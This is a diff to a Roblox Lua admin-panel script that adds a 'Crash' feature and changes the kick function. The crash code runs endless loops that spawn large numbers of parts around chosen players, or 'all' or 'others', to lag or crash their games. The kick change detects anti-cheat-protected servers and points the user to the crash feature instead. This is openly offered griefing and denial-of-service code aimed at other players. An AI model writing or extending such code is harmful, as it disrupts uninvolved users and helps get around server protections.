@@ -60,7 +60,7 @@ scrollFrame.Position = UDim2.new(0, 10, 0, 85)
 scrollFrame.BackgroundTransparency = 1
 scrollFrame.BorderSizePixel = 0
 scrollFrame.ScrollBarThickness = 8
-scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 900)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 950)
 scrollFrame.Parent = mainFrame
 
 -- Health Section
@@ -244,7 +244,7 @@ speedButtonCorner.Parent = setSpeedButton
 
 -- Admin Actions Section
 local adminSection = Instance.new("Frame")
-adminSection.Size = UDim2.new(1, -10, 0, 180)
+adminSection.Size = UDim2.new(1, -10, 0, 220)
 adminSection.Position = UDim2.new(0, 5, 0, 320)
 adminSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 adminSection.BackgroundTransparency = 0.1
@@ -329,10 +329,42 @@ local freezeButtonCorner = Instance.new("UICorner")
 freezeButtonCorner.CornerRadius = UDim.new(0, 4)
 freezeButtonCorner.Parent = freezeButton
 
+-- Crash Player TextBox
+local crashTextBox = Instance.new("TextBox")
+crashTextBox.Size = UDim2.new(0.5, 0, 0, 30)
+crashTextBox.Position = UDim2.new(0.05, 0, 0, 155)
+crashTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+crashTextBox.BorderSizePixel = 1
+crashTextBox.PlaceholderText = "Name / 'all' / 'others'"
+crashTextBox.Text = ""
+crashTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+crashTextBox.TextScaled = true
+crashTextBox.Font = Enum.Font.Gotham
+crashTextBox.Parent = adminSection
+
+local crashBoxCorner = Instance.new("UICorner")
+crashBoxCorner.CornerRadius = UDim.new(0, 4)
+crashBoxCorner.Parent = crashTextBox
+
+local crashButton = Instance.new("TextButton")
+crashButton.Size = UDim2.new(0.35, 0, 0, 30)
+crashButton.Position = UDim2.new(0.6, 0, 0, 155)
+crashButton.BackgroundColor3 = Color3.fromRGB(139, 0, 139)
+crashButton.BorderSizePixel = 0
+crashButton.Text = "CRASH"
+crashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+crashButton.TextScaled = true
+crashButton.Font = Enum.Font.GothamBold
+crashButton.Parent = adminSection
+
+local crashButtonCorner = Instance.new("UICorner")
+crashButtonCorner.CornerRadius = UDim.new(0, 4)
+crashButtonCorner.Parent = crashButton
+
 -- Fun Features Section
 local funSection = Instance.new("Frame")
 funSection.Size = UDim2.new(1, -10, 0, 150)
-funSection.Position = UDim2.new(0, 5, 0, 510)
+funSection.Position = UDim2.new(0, 5, 0, 550)
 funSection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 funSection.BackgroundTransparency = 0.1
 funSection.BorderSizePixel = 0
@@ -656,33 +688,65 @@ local function kickPlayer()
     if targetName == "" then return end
     
     local kickedCount = 0
+    local protectedServer = false
+    
+    -- Test if kick works by attempting on first target
+    local testSuccess = false
     
     -- Check for special keywords
     if targetName == "all" then
         -- Kick everyone including yourself
         for _, targetPlayer in pairs(Players:GetPlayers()) do
-            targetPlayer:Kick("You have been kicked by an admin")
-            kickedCount = kickedCount + 1
+            local success = pcall(function()
+                targetPlayer:Kick("You have been kicked by an admin")
+            end)
+            if success then
+                kickedCount = kickedCount + 1
+                testSuccess = true
+            else
+                protectedServer = true
+            end
         end
     elseif targetName == "others" then
         -- Kick everyone except you
         for _, targetPlayer in pairs(Players:GetPlayers()) do
             if targetPlayer ~= player then
-                targetPlayer:Kick("You have been kicked by an admin")
-                kickedCount = kickedCount + 1
+                local success = pcall(function()
+                    targetPlayer:Kick("You have been kicked by an admin")
+                end)
+                if success then
+                    kickedCount = kickedCount + 1
+                    testSuccess = true
+                else
+                    protectedServer = true
+                end
             end
         end
     else
         -- Kick by partial name match
         for _, targetPlayer in pairs(Players:GetPlayers()) do
             if string.lower(targetPlayer.Name):find(targetName) or string.lower(targetPlayer.DisplayName):find(targetName) then
-                targetPlayer:Kick("You have been kicked by an admin")
-                kickedCount = kickedCount + 1
+                local success = pcall(function()
+                    targetPlayer:Kick("You have been kicked by an admin")
+                end)
+                if success then
+                    kickedCount = kickedCount + 1
+                    testSuccess = true
+                else
+                    protectedServer = true
+                end
             end
         end
     end
     
-    if kickedCount > 0 then
+    if protectedServer and not testSuccess then
+        -- Server has anti-cheat protection
+        kickTextBox.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+        kickTextBox.Text = "PROTECTED - Use Crash instead"
+        wait(2)
+        kickTextBox.Text = ""
+        kickTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    elseif kickedCount > 0 then
         kickTextBox.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
         wait(0.5)
         kickTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -783,6 +847,112 @@ local function freezePlayer()
         wait(0.5)
         freezeTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     end
+end
+
+local crashLoops = {}
+
+local function crashPlayer()
+    local targetName = string.lower(crashTextBox.Text)
+    if targetName == "" then return end
+    
+    local crashedCount = 0
+    
+    -- Check for special keywords
+    if targetName == "all" then
+        -- Crash everyone including yourself
+        for _, targetPlayer in pairs(Players:GetPlayers()) do
+            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                spawn(function()
+                    crashLoops[targetPlayer.Name] = true
+                    local hrp = targetPlayer.Character.HumanoidRootPart
+                    while crashLoops[targetPlayer.Name] and targetPlayer.Character do
+                        for i = 1, 50 do
+                            local part = Instance.new("Part")
+                            part.Size = Vector3.new(10, 10, 10)
+                            part.Position = hrp.Position + Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+                            part.Anchored = true
+                            part.CanCollide = false
+                            part.Transparency = 0.5
+                            part.Parent = workspace
+                            game:GetService("Debris"):AddItem(part, 0.1)
+                        end
+                        wait(0.05)
+                    end
+                end)
+                crashedCount = crashedCount + 1
+            end
+        end
+    elseif targetName == "others" then
+        -- Crash everyone except you
+        for _, targetPlayer in pairs(Players:GetPlayers()) do
+            if targetPlayer ~= player and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                spawn(function()
+                    crashLoops[targetPlayer.Name] = true
+                    local hrp = targetPlayer.Character.HumanoidRootPart
+                    while crashLoops[targetPlayer.Name] and targetPlayer.Character do
+                        for i = 1, 50 do
+                            local part = Instance.new("Part")
+                            part.Size = Vector3.new(10, 10, 10)
+                            part.Position = hrp.Position + Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+                            part.Anchored = true
+                            part.CanCollide = false
+                            part.Transparency = 0.5
+                            part.Parent = workspace
+                            game:GetService("Debris"):AddItem(part, 0.1)
+                        end
+                        wait(0.05)
+                    end
+                end)
+                crashedCount = crashedCount + 1
+            end
+        end
+    else
+        -- Crash by partial name match
+        for _, targetPlayer in pairs(Players:GetPlayers()) do
+            if (string.lower(targetPlayer.Name):find(targetName) or string.lower(targetPlayer.DisplayName):find(targetName))
+               and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                spawn(function()
+                    crashLoops[targetPlayer.Name] = true
+                    local hrp = targetPlayer.Character.HumanoidRootPart
+                    while crashLoops[targetPlayer.Name] and targetPlayer.Character do
+                        for i = 1, 50 do
+                            local part = Instance.new("Part")
+                            part.Size = Vector3.new(10, 10, 10)
+                            part.Position = hrp.Position + Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+                            part.Anchored = true
+                            part.CanCollide = false
+                            part.Transparency = 0.5
+                            part.Parent = workspace
+                            game:GetService("Debris"):AddItem(part, 0.1)
+                        end
+                        wait(0.05)
+                    end
+                end)
+                crashedCount = crashedCount + 1
+            end
+        end
+    end
+    
+    if crashedCount > 0 then
+        crashTextBox.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+        crashButton.Text = "STOP CRASH"
+        crashButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        wait(0.5)
+        crashTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    else
+        crashTextBox.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        wait(0.5)
+        crashTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    end
+end
+
+local function stopCrash()
+    for playerName, _ in pairs(crashLoops) do
+        crashLoops[playerName] = false
+    end
+    crashLoops = {}
+    crashButton.Text = "CRASH"
+    crashButton.BackgroundColor3 = Color3.fromRGB(139, 0, 139)
 end
 
 local function addHoverEffect(button, originalColor)
